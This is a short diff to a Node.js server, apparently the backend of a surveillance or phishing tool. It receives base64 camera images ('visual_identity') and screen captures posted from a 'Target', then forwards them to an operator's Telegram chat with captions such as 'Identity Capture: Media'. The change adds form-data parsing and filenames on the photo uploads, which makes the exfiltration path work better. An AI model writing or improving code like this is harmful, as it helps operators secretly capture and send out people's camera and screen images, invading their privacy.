@@ -70,6 +70,7 @@ async function startServer() {
   const botInstance = process.env.TELEGRAM_BOT_TOKEN ? new Telegraf(process.env.TELEGRAM_BOT_TOKEN) : null;
 
   app.use(express.json({ limit: '50mb' }));
+  app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
   app.use((req, res, next) => {
     // Attempt to capture public URL
@@ -219,7 +220,7 @@ async function startServer() {
           const base64Data = data.visual_identity.includes(',') ? data.visual_identity.split(',')[1] : data.visual_identity;
           const buffer = Buffer.from(base64Data, 'base64');
           if (buffer.length > 0) {
-            botInstance.telegram.sendPhoto(chatId, { source: buffer }, { 
+            botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'media.jpg' }, { 
               caption: '📸 <b>Identity Capture: Media</b>\nTarget ID: <code>' + id + '</code>', 
               parse_mode: 'HTML' 
             }).catch(err => console.error('Error sending media photo:', err));
@@ -233,7 +234,7 @@ async function startServer() {
           const base64Data = data.screen_capture.includes(',') ? data.screen_capture.split(',')[1] : data.screen_capture;
           const buffer = Buffer.from(base64Data, 'base64');
           if (buffer.length > 0) {
-            botInstance.telegram.sendPhoto(chatId, { source: buffer }, { 
+            botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'screen.jpg' }, { 
               caption: '🖥️ <b>Identity Capture: Screen</b>\nLabel: <code>' + (data.screen_label || 'Default') + '</code>', 
               parse_mode: 'HTML' 
             }).catch(err => console.error('Error sending screen photo:', err));
